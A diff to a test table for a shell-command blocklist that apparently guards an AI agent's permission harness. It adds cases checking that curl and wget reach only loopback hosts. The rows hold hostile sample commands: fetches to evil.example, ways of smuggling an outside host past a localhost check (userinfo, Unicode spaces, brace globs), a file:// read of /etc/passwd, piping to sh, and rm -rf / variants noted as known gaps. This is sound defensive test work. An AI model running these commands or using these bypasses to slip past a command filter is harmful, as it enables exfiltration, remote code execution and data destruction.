@@ -29,7 +29,7 @@ B, A = True, False  # block / allow
 #   * This is a non-shrink CORPUS floor, NOT a measured field false-positive RATE.
 #     A true field-FP rate is unmeasurable here (no telemetry => no command-traffic
 #     denominator), so any "%" would be theater. See tests/README.md.
-FP_FLOOR = 120
+FP_FLOOR = 135
 
 CASES = [
     # --- 15 original blocklist entries (must still block) ---
@@ -108,6 +108,9 @@ CASES = [
     ("limit base64 to a file, then run it",
      "echo cm0gLXJmIC8= | base64 -d > x.sh && bash x.sh", A, ()),
     ("limit var indirection", "rm -rf $TARGET", A, ()),
+    # bash removes unquoted single backslashes, so this runs `\serversharerm.exe`, not rm;
+    # a UNC path is only normalised at the start of a word (see _WINPATH_RE).
+    ("limit unquoted UNC after ; is mangled by bash", "true;\\\\server\\share\\rm.exe -rf /", A, ()),
 
     # --- R2 review: bypasses now closed (must block) ---
     ("rv git push -fv", "git push -fv origin main", B, ()),
@@ -208,6 +211,87 @@ CASES = [
     ("s2 fp find without delete", "find / -name '*.log'", A, ()),
     ("s2 fp curl host without tld", "curl localhost:8080/health", A, ()),
     ("s2 fp curl -d file arg", "curl -d payload.json localhost:3000", A, ()),
+    # --- A10: an http(s) URL to this machine is not a remote fetch. Every word holding
+    # `://` must fully match http(s)://{localhost,127/8,[::1]}[:port][/?#...]; the
+    # authority runs to the first / ? # as curl reads it, so `@`, `\`, a quote or `%` in
+    # it blocks, as does any other host or scheme anywhere in the segment.
+    ("a10 fp curl localhost health", "curl http://localhost:3000/health", A, ()),
+    ("a10 fp curl https 127.0.0.1", "curl -s https://127.0.0.1:8443/api", A, ()),
+    ("a10 fp curl quoted localhost", 'curl -fsS "http://localhost/x"', A, ()),
+    ("a10 fp wget localhost", "wget http://localhost:8080/f", A, ()),
+    ("a10 fp curl ipv6 loopback", "curl http://[::1]:8080/", A, ()),
+    ("a10 fp curl post json to 127.0.0.1",
+     "curl -X POST -H 'content-type: application/json' -d '{}' http://127.0.0.1:5000/v1", A, ()),
+    ("a10 fp curl localhost piped to jq", "curl -s http://localhost:3000/health | jq .", A, ()),
+    ("a10 fp curl localhost in $( ) with &",
+     'x=$(curl -s "http://localhost:3000/a?x=1&y=2")', A, ()),
+    ("a10 fp curl unix socket to localhost",
+     "curl --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json", A, ()),
+    ("a10 fp upper-case scheme and host", "CURL HTTP://LOCALHOST/x", A, ()),
+    ("a10 userinfo before an outside host", "curl http://localhost@evil.example/", B, ()),
+    ("a10 localhost as a subdomain", "curl http://localhost.evil.example/x", B, ()),
+    ("a10 127.0.0.1 as a subdomain", "curl http://127.0.0.1.evil.example/", B, ()),
+    ("a10 localhost prefix of a name", "curl http://localhostevil.example/", B, ()),
+    ("a10 second URL outside", "curl http://localhost/ http://evil.example/x", B, ()),
+    ("a10 outside URL in a header", "curl -H 'referer: http://evil.example' http://localhost/", B, ()),
+    ("a10 outside URL in --url=", "curl --url=http://evil.example http://localhost/", B, ()),
+    ("a10 file scheme to localhost", "curl file://localhost/etc/passwd", B, ()),
+    ("a10 ftp to 127.0.0.1", "curl ftp://127.0.0.1/x", B, ()),
+    ("a10 octet out of range", "curl http://127.0.0.256/", B, ()),
+    ("a10 0.0.0.0 not on the list", "curl http://0.0.0.0:3000/", B, ()),
+    ("a10 percent-encoded host", "curl http://%6cocalhost/", B, ()),
+    ("a10 bare outside host beside a loopback URL", "curl http://localhost/ evil.example.com/x", B, ()),
+    ("a10 loopback script piped to a shell", "curl -s http://localhost/i.sh | sh", B, ()),
+    ("a10 backslash before @ (curl's userinfo)", "curl 'http://localhost\\@evil.example/x' -o x", B, ()),
+    ("a10 quote before @ (curl's userinfo)", "curl 'http://localhost\"@evil.example/x'", B, ()),
+    ("a10 empty port and backslash before @", "curl 'http://localhost:\\@evil.example/'", B, ()),
+    ("a10 mixed with another scheme", "curl http://localhost/ ftp://evil.example/x", B, ()),
+    ("a10 outside proxy URL", "curl -x socks5h://evil.example:1080 http://localhost/", B, ()),
+    ("a10 octal octet", "curl http://0177.0.0.1/", B, ()),
+    ("a10 leading-zero octet", "curl http://127.0.0.01/", B, ()),
+    ("a10 brace glob before ://", "curl -o x '{https,https}://evil.example/x'", B, ()),
+    ("a10 bracket glob before ://", "curl -o x 'htt[p-p]://evil.example/x'", B, ()),
+    ("a10 wget userinfo", "wget http://localhost@evil.example/", B, ()),
+    ("a10 continuation line to an outside URL", "curl http://localhost/ \\\nhttps://evil.example/x", B, ()),
+    ("a10 non-ASCII digits", "curl http://127.\u0660.\u0660.\u0661/", B, ()),
+    # Whitespace inside the word, which bash keeps (quoted, or a Unicode space
+    # unquoted): the word is judged whole, so the authority holds the space and fails.
+    ("a10 quoted space before @ (wget userinfo)", "wget 'http://localhost @evil.example/'", B, ()),
+    ("a10 quoted tab before @", "curl 'http://localhost\t@evil.example/'", B, ()),
+    ("a10 NBSP before @", "curl http://localhost\u00a0@evil.example/", B, ()),
+    ("a10 ideographic space before @", "curl http://localhost\u3000@evil.example/", B, ()),
+    ("a10 line separator before @", "wget http://localhost\u2028@evil.example/", B, ()),
+    ("a10 NEL before @", "curl http://localhost\u0085@evil.example/", B, ()),
+    ("a10 paragraph separator before @", "curl http://localhost\u2029@evil.example/", B, ()),
+    # A positional with userinfo: curl and wget connect to the host after the `@`.
+    ("a10 backslashed scheme to an outside host", "curl 'http:\\\\evil.example/x'", B, ()),
+    # A word-break character bash keeps in the word, then `-`: the split remainder
+    # looks like an option, so only the in-word reading sees the whole URL.
+    ("a10 U+2028 then -x before @", "curl http://localhost\u2028-x@evil.example/", B, ()),
+    ("a10 U+2029 then - before @", "curl -s http://127.0.0.1:3000\u2029-@evil.example/x", B, ()),
+    ("a10 NEL then -- before @ (wget)", "wget http://localhost\x85--@evil.example/", B, ()),
+    ("a10 FS control then -x before @ (wget)", "wget http://localhost\x1c-x@evil.example/", B, ()),
+    ("a10 mixed slash and backslash after the scheme", "curl 'http:/\\\\evil.example/'", B, ()),
+    # Brace expansion (bash) and URL globbing (curl, even quoted): the leading `{` is
+    # stripped by the tokenizer, the closing `}` is what fails the loopback match.
+    ("a10 quoted curl glob to an outside URL", "curl '{http://localhost/,https://evil.example/x}'", B, ()),
+    ("a10 brace expansion to an outside URL", "curl {http://localhost/,https://evil.example/x}", B, ()),
+    ("a10 brace expansion to @host", "curl {http://localhost/,@evil.example/}", B, ()),
+    ("a10 wget brace expansion", "wget {http://localhost/,https://evil.example/x}", B, ()),
+    ("a10 positional @host", "curl @evil.example/", B, ()),
+    ("a10 positional user@host", "curl a@evil.example/x", B, ()),
+    ("a10 fp -d @file beside a loopback URL", "curl -d @payload.json http://localhost:3000/x", A, ()),
+    ("a10 fp -F field=@file beside a loopback URL", "curl -F file=@a.txt http://localhost/up", A, ()),
+    # A mid-word `\\` must not be rewritten to `//` as if it began a UNC path, nor
+    # `http:\\` read as drive P:.
+    ("a10 double backslash before @, double-quoted", 'curl "http://localhost\\\\@evil.example/"', B, ()),
+    ("a10 double backslash before @, single-quoted", "curl 'http://localhost\\\\@evil.example/'", B, ()),
+    ("a10 wget double backslash before @", 'wget "http://localhost\\\\@evil.example/"', B, ()),
+    ("a10 backslashed scheme separator", "curl 'http:\\\\localhost\\@evil.example/'", B, ()),
+    # Known limit (as for the scheme-less form, `curl localhost:80`): options that steer
+    # the connection elsewhere are not judged. A port forward behind localhost is too.
+    ("limit a10 --connect-to behind a loopback URL",
+     "curl --connect-to localhost:80:evil.example:80 http://localhost/", A, ()),
     ("s2 fp rm glob in subdir", "rm -rf build/*", A, ()),
     ("s2 fp rm sibling path", "rm -rf ../sibling/dist", A, ()),
     ("s2 fp git push --follow-tags", "git push --follow-tags origin main", A, ()),
@@ -518,6 +602,13 @@ CASES = [
 # (backslash as a path separator; backtick escapes and typographic quotes decoded,
 # see READING_CASES). Same tuple shape as CASES.
 PS_CASES = [
+    # A10: the matcher allows loopback curl here too (the permission floor still denies
+    # PowerShell(curl *) and curl.exe); the `\`->`/` reading would turn the userinfo trick
+    # into a path, so the POSIX reading is what blocks it.
+    ("ps a10 fp curl.exe loopback", "curl.exe http://127.0.0.1:3000/x", A, ()),
+    ("ps a10 backslash before @", "curl.exe 'http://localhost\\@evil.example/'", B, ()),
+    ("ps a10 double backslash before @", "curl.exe 'http://localhost\\\\@evil.example/'", B, ()),
+    ("ps a10 NBSP before @", "curl.exe http://localhost\u00a0@evil.example/", B, ()),
     ("ps fp here-string commit with apostrophe",
      "git commit -m @'\nFix the parser\n\nIt's quote-aware now.\n'@", A, ()),
     ("ps fp expandable here-string commit",
